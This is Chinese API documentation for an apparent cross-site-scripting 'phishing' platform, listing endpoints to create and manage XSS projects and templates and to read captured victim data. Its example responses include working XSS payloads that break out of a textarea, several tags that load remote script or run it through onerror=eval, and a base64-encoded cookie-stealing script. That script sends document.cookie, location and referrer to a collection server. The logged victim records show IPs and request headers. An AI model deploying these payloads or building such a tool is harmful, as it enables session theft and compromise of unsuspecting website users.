### 创建跨站脚本钓鱼项目

`/api/create_cross_site_script_project/`用来创建跨站脚本项目

```json
{
	"token": "",
	"project_name":"",
	"javascript_data":""
}
```

>参数解释

- `token`登录后返回的**token**
- `project_name`该项目的项目名
- `javascript_data`进行过base64加密后的JS文件数据

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
- 200：创建后本地生成的js文件
- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
- 500：请使用Post请求

### 修改跨站脚本钓鱼项目

`/api/modify_cross_site_script_project/`用来修改跨站脚本项目

```json
{
	"token": "",
	"project_associated_file_name":"",
	"project_associated_file_data":""
}
```

>参数解释

- `token`登录后返回的**token**
- `project_associated_file_name`该项目生成的文件名
- `project_associated_file_data`需要对文件修改的数据，需要进行base64加密后传入

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
- 200：文件内容覆盖成功~
- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
- 404：你没有查询这个项目的权限哦宝贝~
- 500：请使用Post请求

### 查询跨站脚本钓鱼项目

`/api/query_cross_site_script_project/`用来查询用户的跨站脚本项目

```json
{
	"token": "",
  "number_of_pages":"1"
}
```

>参数解释

- `token`登录后返回的**token**
- `number_of_pages`页数

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)

- 200：返回查询到的项目信息

  ```json
  {
  	"message": [{
  		"project_name": "123123",
  		"file_name": "HXKZM",
  		"creation_time": "1608208943"
  	}, {
  		"project_name": "test",
  		"file_name": "Ks1ZM",
  		"creation_time": "1628208943"
  	}],
    "number": 2,
  	"code": 200
  }
  ```

  > 返回参数解释

  - `message` **会有多个数组的集合**

    - `project_name`项目名称

    - `file_name`文件名称

    - `creation_time`创建时间

  - `number`个数

- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧

- 500：请使用Post请求

### 查询跨站脚本钓鱼项目中数据

`/api/query_cross_site_script_project_data/`用来查询用户的跨站脚本项目中的数据信息

```json
{
	"token": "",
	"project_associated_file_name":"",
  "number_of_pages":"1"
}
```

>参数解释

- `token`登录后返回的**token**
- `project_associated_file_name`项目中生成的特殊文件名，也就是**/api/query_cross_site_scripting_project/**接口传回的**file_name**数据
- `number_of_pages`页数

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)

- 200：返回查询到的项目信息

  ```json
  {
  	"message": [{
  		"headers": "eydDb250ZW50LUxlbmd0aCc6ICcnLCAnQ29udGVudC1UeXBlJzogJ3RleHQvcGxhaW4nLCAnSG9zdCc6ICcxMDEuMzcuMTQuMTQ0Ojg4ODgnLCAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV80KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODcuMC40MjgwLjg4IFNhZmFyaS81MzcuMzYnLCAnQWNjZXB0JzogJyovKicsICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsICdBY2NlcHQtTGFuZ3VhZ2UnOiAnemgtQ04semg7cT0wLjknLCAnQ29ubmVjdGlvbic6ICdjbG9zZSd9",
  		"project_associated_file_name": "KE29b",
  		"ip": "142.3.56.28",
  		"full_url": "http://1127.0.0.1:8888/a/KE29b/",
  		"creation_time": "1609233542",
  		"request_method": "GET",
  		"data_pack": "e30="
  	}, {
  		"headers": "eydDb250ZW50LUxlbmd0aCc6ICcnLCAnQ29udGVudC1UeXBlJzogJ3RleHQvcGxhaW4nLCAnSG9zdCc6ICcxMDEuMzcuMTQuMTQ0Ojg4ODgnLCAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV80KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODcuMC40MjgwLjg4IFNhZmFyaS81MzcuMzYnLCAnQWNjZXB0JzogJ2ltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLGltYWdlLyosKi8qO3E9MC44JywgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywgJ0FjY2VwdC1MYW5ndWFnZSc6ICd6aC1DTix6aDtxPTAuOScsICdDb25uZWN0aW9uJzogJ2Nsb3NlJ30=",
  		"project_associated_file_name": "KE29b",
  		"ip": "142.3.56.28",
  		"full_url": "http://127.0.0.1:8888/a/KE29b/?location=file%3A///Users/user/Desktop/test.html&toplocation=file%3A///Users/user/Desktop/test.html&cookie=&opener=&referrer=&title=",
  		"creation_time": "1609233552",
  		"request_method": "GET",
  		"data_pack": "eydsb2NhdGlvbic6ICdmaWxlOi8vL1VzZXJzL3VzZXIvRGVza3RvcC90ZXN0Lmh0bWwnLCAndG9wbG9jYXRpb24nOiAnZmlsZTovLy9Vc2Vycy91c2VyL0Rlc2t0b3AvdGVzdC5odG1sJywgJ2Nvb2tpZSc6ICcnLCAnb3BlbmVyJzogJycsICdyZWZlcnJlcic6ICcnLCAndGl0bGUnOiAnJ30="
  	}],
    "number": 2,
  	"code": 200
  }
  ```

  > 返回参数解释

  - `message` **会有多个数组的集合**

    - `headers`受害者请求头数据，需要base64解密

    - `project_associated_file_name`文件名称

    - `ip`受害者IP

    - `full_url`受害者请求完整路径

    - `creation_time`受害者请求连接

    - `request_method`请求方式

    - `data_pack`请求数据包，需要base64解密

  - `number`个数

- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧

- 404：你没有查询这个项目的权限哦宝贝~

- 500：请使用Post请求

### 查询跨站脚本钓鱼项目详细信息

`/api/query_cross_site_script_project_info/`用来查询用户的跨站脚本项目的详细信息

```json
{
	"token": "",
	"project_associated_file_name":""
}
```

>参数解释

- `token`登录后返回的**token**
- `project_associated_file_name`创建项目是生成的文件，创建项目时会返回

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)

- 200：返回项目中js文件的详细信息，内容通过base64编码过，以及几个POC的利用语句

  ```json
  {
  	"message": {
  		"project_associated_file_data": "dmFyIHggPSBuZXcgSW1hZ2UoKTsKdHJ5IHsKICAgIHZhciBteW9wZW5lciA9ICcnOwogICAgbXlvcGVuZXIgPSB3aW5kb3cub3BlbmVyICYmIHdpbmRvdy5vcGVuZXIubG9jYXRpb24gPyB3aW5kb3cub3BlbmVyLmxvY2F0aW9uOiAnJzsKfSBjYXRjaChlcnIpIHt9Cnguc3JjID0gJ2h0dHA6Ly8xMDEuMzcuMTQuMTQ0Ojg4ODgvYS9LRTI5Yi8/bG9jYXRpb249Jytlc2NhcGUoZG9jdW1lbnQubG9jYXRpb24pKycmdG9wbG9jYXRpb249Jytlc2NhcGUodG9wLmRvY3VtZW50LmxvY2F0aW9uKSsnJmNvb2tpZT0nK2VzY2FwZShkb2N1bWVudC5jb29raWUpKycmb3BlbmVyPScrZXNjYXBlKG15b3BlbmVyKSsnJnJlZmVycmVyPScrZXNjYXBlKGRvY3VtZW50LnJlZmVycmVyKSsnJnRpdGxlPScrZXNjYXBlKGRvY3VtZW50LnRpdGxlKTs=",
  		"the_first_use": "</tExtArEa>'\"><sCRiPt sRC=//127.0.0.1:1234/s/KE29b></sCrIpT>",
  		"the_second_use": "<sCRiPt/SrC=//127.0.0.1:1234/s/KE29b>",
  		"the_third_use": "<img sRC=//127.0.0.1:1234/s/KE29b>",
  		"exploit_path": "//127.0.0.1:1234/s/KE29b",
  		"coding_exploit": "</tEXtArEa>'\"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22%2F%2F127.0.0.1:1234%2Fs%2FKE29b%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>"
  	},
  	"code": 200
  }
  ```

  > 返回参数解释

  - `project_associated_file_data`项目文件完整内容，需要用base64解密
  - `the_first_use`第一个POC
  - `the_second_use`第二个POC
  - `the_third_use`第三个POC
  - `exploit_path`第四个POC
  - `coding_exploit`第五个POC

- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧

- 404：你没有查询这个项目的权限哦宝贝~

- 500：请使用Post请求

### 读取默认跨站脚本模板数据

`/api/read_default_cross_site_script_template/`用来跨站脚本中的默认数据有哪些

```json
{
	"token": ""
}
```

>参数解释

- `token`登录后返回的**token**

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)

- 200：返回查询到的项目信息

  ```json
  {
  	"message": [{
  		"file_name": "test.js",
  		"file_data": "YWxlcnQoInhzcyIpOw=="
  	}, {
  		"file_name": "get_cookie.js",
  		"file_data": "dmFyIHggPSBuZXcgSW1hZ2UoKTsKdHJ5IHsKICAgIHZhciBteW9wZW5lciA9ICcnOwogICAgbXlvcGVuZXIgPSB3aW5kb3cub3BlbmVyICYmIHdpbmRvdy5vcGVuZXIubG9jYXRpb24gPyB3aW5kb3cub3BlbmVyLmxvY2F0aW9uOiAnJzsKfSBjYXRjaChlcnIpIHt9Cnguc3JjID0gJ2h0dHA6Ly9pcC9hL+mhueebruaWh+S7tuWcsOWdgC8/bG9jYXRpb249Jytlc2NhcGUoZG9jdW1lbnQubG9jYXRpb24pKycmdG9wbG9jYXRpb249Jytlc2NhcGUodG9wLmRvY3VtZW50LmxvY2F0aW9uKSsnJmNvb2tpZT0nK2VzY2FwZShkb2N1bWVudC5jb29raWUpKycmb3BlbmVyPScrZXNjYXBlKG15b3BlbmVyKSsnJnJlZmVycmVyPScrZXNjYXBlKGRvY3VtZW50LnJlZmVycmVyKSsnJnRpdGxlPScrZXNjYXBlKGRvY3VtZW50LnRpdGxlKTs="
  	}],
  	"code": 200
  }
  ```

  > 返回参数解释

  **会有多个数组的集合**

  - `file_name`文件名称
  - `file_data`文件数据，需要base64解密

- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧

- 500：请使用Post请求

### 读取用户自定义跨站脚本模板数据

`/api/read_cross_site_script_template/`用来获取数据库中用户自定义的所有跨站脚本模板数据

```json
{
	"token": ""
}
```

>参数解释

- `token`登录后返回的**token**

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)

- 200：返回查询到的项目信息

  ```json
  {
  	"message": [{
  		"template_name": "test",
  		"template_data": "Ij48aDE+MTEx",
  		"creation_time": "1609232907",
  		"update_time": "1609233097"
  	}, {
  		"template_name": "11",
  		"template_data": "MTE=",
  		"creation_time": "1609234294",
  		"update_time": "1609234294"
  	}],
  	"code": 200
  }
  ```

  > 返回参数解释

  **会有多个数组的集合**

  - `template_name`模板名称
  - `template_data`模板数据，需要使用base64解密
  - `creation_time`模板创建时间
  - `update_time`模板更新时间

- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧

- 500：请使用Post请求

### 保存用户自定义跨站脚本模板数据

`/api/save_cross_site_script_template/`用来生成用户自定义模板中的数据

```json
{
	"token": "",
	"template_name":"",
	"template_data":""
}
```

>参数解释

- `token`登录后返回的**token**
- `template_name`模板名
- `template_data`模板数据

> 返回状态码

- 200：模板写入成功
- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
- 500：请使用Post请求
- 503：该模板已存在！

### 修改用户自定义跨站脚本模板数据

`/api/modify_cross_site_script_template/`用来修改用户自定义的模板数据

```json
{
	"token": "",
	"template_name":"",
	"template_data":""
}
```

>参数解释

- `token`登录后返回的**token**
- `template_name`模板名
- `template_data`模板数据

> 返回状态码

- 200：模板写入成功
- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
- 404：不存在该模板哦宝贝~
- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
- 500：请使用Post请求
- 501：模板更新失败

### 删除用户自定义模板数据

`/api/delete_cross_site_script_template/`

```json
{
	"token": "",
	"template_name":""
}
```

>参数解释

- `token`登录后返回的**token**
- `template_name`模板的名字

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
- 170：删除失败！
- 200：删除成功
- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
- 404：你没有查询这个项目的权限哦宝贝~
- 500：请使用Post请求

### 删除跨站脚本钓鱼项目

`/api/delete_cross_site_script_project/`

```json
{
	"token": "",
	"project_name":"xx"
}
```

>参数解释

- `token`登录后返回的**token**
- `project_name`模板的名字

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
- 170：项目删除失败！
- 200：删除成功~
- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
- 404：你没有查询这个项目的权限哦宝贝~
- 500：请使用Post请求

